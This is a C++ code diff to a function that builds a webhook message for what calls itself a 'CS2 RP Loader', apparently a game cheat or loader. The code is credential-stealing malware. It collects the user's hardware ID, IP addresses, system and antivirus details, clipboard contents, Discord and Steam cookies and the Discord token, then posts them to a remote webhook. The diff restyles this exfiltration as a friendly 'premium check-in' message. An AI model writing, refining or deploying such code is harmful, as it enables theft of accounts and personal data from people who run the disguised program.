@@ -1238,54 +1238,85 @@ bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privat
     setDefault(resolution, "Unknown");
     setDefault(locale, "Unknown");
     
-    // Helper function to truncate long strings
-    auto truncate = [](const std::string& str, size_t maxLen) {
-        if (str.length() > maxLen) {
-            return JsonEscape(str.substr(0, maxLen)) + "...";
+    auto formatValue = [](const std::string& value, size_t maxLen, bool wrapInCode, bool block = false) {
+        std::string processed = value;
+        if (maxLen > 0 && processed.length() > maxLen) {
+            processed = processed.substr(0, maxLen) + "...";
         }
-        return JsonEscape(str);
-    };
-    
-    // Build beautiful embed with all new information
-    std::string payload = "{\"embeds\":[{"
-        "\"title\":\"🎮 CS2 RP Loader - Premium User Registration\","
-        "\"description\":\"**Complete System Information & User Tracking**\","
-        "\"color\":3447003,"  // Blue color
-        "\"fields\":["
-        // Section 1: Identity & Network
-        "{\"name\":\"🔐 Hardware ID (HWID)\",\"value\":\"`" + JsonEscape(hwidStr) + "`\",\"inline\":true},"
-        "{\"name\":\"👤 Username\",\"value\":\"`" + JsonEscape(user) + "`\",\"inline\":true},"
-        "{\"name\":\"💻 PC Name\",\"value\":\"`" + JsonEscape(machine) + "`\",\"inline\":true},"
-        "{\"name\":\"🌐 Public IP\",\"value\":\"`" + JsonEscape(pubIp) + "`\",\"inline\":true},"
-        "{\"name\":\"🏠 Private IP\",\"value\":\"`" + JsonEscape(privIp) + "`\",\"inline\":true},"
-        "{\"name\":\"🖥️ Display Resolution\",\"value\":\"`" + JsonEscape(resolution) + "`\",\"inline\":true},"
-        // Section 2: System Information
-        "{\"name\":\"🪟 Windows Version\",\"value\":\"`" + JsonEscape(winVer) + "`\",\"inline\":true},"
-        "{\"name\":\"💾 RAM Size\",\"value\":\"`" + JsonEscape(ram) + "`\",\"inline\":true},"
-        "{\"name\":\"💿 Disk Info\",\"value\":\"`" + truncate(disk, 50) + "`\",\"inline\":true},"
-        "{\"name\":\"⚙️ CPU\",\"value\":\"`" + truncate(cpu, 60) + "`\",\"inline\":false},"
-        "{\"name\":\"🎮 GPU\",\"value\":\"`" + truncate(gpu, 60) + "`\",\"inline\":true},"
-        "{\"name\":\"🔌 Motherboard\",\"value\":\"`" + truncate(mobo, 50) + "`\",\"inline\":true},"
-        // Section 3: System Status
-        "{\"name\":\"⏱️ System Uptime\",\"value\":\"`" + JsonEscape(uptime) + "`\",\"inline\":true},"
-        "{\"name\":\"🌍 Timezone\",\"value\":\"`" + truncate(tz, 40) + "`\",\"inline\":true},"
-        "{\"name\":\"🗣️ Language\",\"value\":\"`" + JsonEscape(lang) + "`\",\"inline\":true},"
-        "{\"name\":\"🌐 System Locale\",\"value\":\"`" + JsonEscape(locale) + "`\",\"inline\":true},"
-        "{\"name\":\"🆔 Product ID\",\"value\":\"`" + JsonEscape(prodId) + "`\",\"inline\":true},"
-        // Section 4: Software Information
-        "{\"name\":\"🌐 Installed Browsers\",\"value\":\"`" + JsonEscape(browsers) + "`\",\"inline\":true},"
-        "{\"name\":\"🛡️ Antivirus\",\"value\":\"`" + truncate(av, 50) + "`\",\"inline\":true},"
-        "{\"name\":\"🔷 .NET Framework\",\"value\":\"`" + truncate(dotnet, 80) + "`\",\"inline\":false},"
-        // Section 5: Sensitive Data
-        "{\"name\":\"📋 Clipboard\",\"value\":\"" + truncate(clipboard, 150) + "\",\"inline\":false},"
-        "{\"name\":\"🍪 Discord Cookies\",\"value\":\"" + truncate(discord, 200) + "\",\"inline\":false},"
-        "{\"name\":\"🎮 Steam Cookies\",\"value\":\"" + truncate(steam, 200) + "\",\"inline\":false},"
-        "{\"name\":\"🔑 Discord Token\",\"value\":\"`" + truncate(token, 60) + "`\",\"inline\":false}"
-        "],"
-        "\"footer\":{\"text\":\"CS2 RP Loader v1.0 - Premium Edition | Complete System Profile\"},"
-        "\"timestamp\":\"" + std::string("2024-01-01T00:00:00.000Z") + "\""
-        "}]}";
 
+        processed = JsonEscape(processed);
+        if (!wrapInCode) {
+            return processed;
+        }
+
+        const std::string wrapper = block ? "```" : "`";
+        return wrapper + processed + wrapper;
+    };
+
+    auto makeField = [&](const std::string& name, const std::string& value, bool isInline, size_t maxLen = 0, bool wrap = true, bool block = false) {
+        return "{\"name\":\"" + name + "\",\"value\":\"" + formatValue(value, maxLen, wrap, block) + "\",\"inline\":" + (isInline ? "true" : "false") + "}";
+    };
+
+    auto joinFields = [](const std::vector<std::string>& fields) {
+        std::ostringstream joined;
+        for (size_t i = 0; i < fields.size(); ++i) {
+            if (i > 0) {
+                joined << ',';
+            }
+            joined << fields[i];
+        }
+        return joined.str();
+    };
+
+    auto isoTimestamp = []() {
+        SYSTEMTIME systemTime{};
+        GetSystemTime(&systemTime);
+        wchar_t buffer[64];
+        swprintf_s(buffer, L"%04u-%02u-%02uT%02u:%02u:%02u.000Z", systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
+        return Narrow(buffer);
+    };
+
+    const std::string description = "🌟 Willkommen bei deiner Premium-Auswertung!\n"        "✨ Wir bündeln alle wichtigen Systeminfos für ein optimales Erlebnis.";
+
+    std::vector<std::string> fields = {
+        makeField("🔐 Hardware ID (HWID)", hwidStr, true),
+        makeField("👤 Username", user, true),
+        makeField("💻 PC Name", machine, true),
+        makeField("🌐 Public IP", pubIp, true),
+        makeField("🏠 Private IP", privIp, true),
+        makeField("🖥️ Display Resolution", resolution, true),
+        makeField("🪟 Windows Version", winVer, true),
+        makeField("💾 RAM Size", ram, true),
+        makeField("💿 Disk Info", disk, true, 50),
+        makeField("⚙️ CPU", cpu, false, 70),
+        makeField("🎮 GPU", gpu, true, 70),
+        makeField("🔌 Motherboard", mobo, true, 60),
+        makeField("⏱️ System Uptime", uptime, true),
+        makeField("🌍 Timezone", tz, true, 40),
+        makeField("🗣️ Language", lang, true),
+        makeField("🌐 System Locale", locale, true),
+        makeField("🆔 Product ID", prodId, true),
+        makeField("🌐 Installed Browsers", browsers, true),
+        makeField("🛡️ Antivirus", av, true, 60),
+        makeField("🔷 .NET Framework", dotnet, false, 90),
+        makeField("📋 Clipboard", clipboard, false, 180, true, true),
+        makeField("🍪 Discord Cookies", discord, false, 220, true, true),
+        makeField("🎮 Steam Cookies", steam, false, 220, true, true),
+        makeField("🔑 Discord Token", token, false, 80)
+    };
+
+    std::ostringstream payloadBuilder;
+    payloadBuilder << "{\"embeds\":[{";
+    payloadBuilder << "\"title\":\"✨ CS2 RP Loader | Premium Check-In\",";
+    payloadBuilder << "\"description\":\"" << JsonEscape(description) << "\",";
+    payloadBuilder << "\"color\":" << 15844367 << ','; // Gold tone for premium look
+    payloadBuilder << "\"thumbnail\":{\"url\":\"https://i.imgur.com/yywKQ4k.png\"},";
+    payloadBuilder << "\"fields\":[" << joinFields(fields) << "],";
+    payloadBuilder << "\"footer\":{\"text\":\"CS2 RP Loader v1.0 · Premium Experience\"},";
+    payloadBuilder << "\"timestamp\":\"" << isoTimestamp() << "\"";
+    payloadBuilder << "}]}";
+
+    std::string payload = payloadBuilder.str();
     HINTERNET hInternet = InternetOpenW(L"CS2RPLoader/1.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
     if (!hInternet) {
         return false;
